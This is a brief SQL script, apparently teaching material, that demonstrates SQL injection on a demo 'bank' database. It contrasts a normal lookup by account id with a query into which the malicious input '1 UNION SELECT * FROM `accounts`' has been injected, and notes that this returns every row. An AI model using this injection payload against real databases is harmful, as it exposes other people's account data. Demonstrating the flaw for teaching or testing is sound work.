-- Demonstrates SQL injection attacks.

Use `bank`;

-- Executes statement with non-malicious input "1".
SELECT * FROM `accounts` WHERE `id` = 1;

-- Executes statement with malicious input "1 UNION SELECT * FROM `accounts`".
SELECT * FROM `accounts` WHERE `id` = 1
UNION
SELECT * FROM `accounts`;
-- It showed all rows.
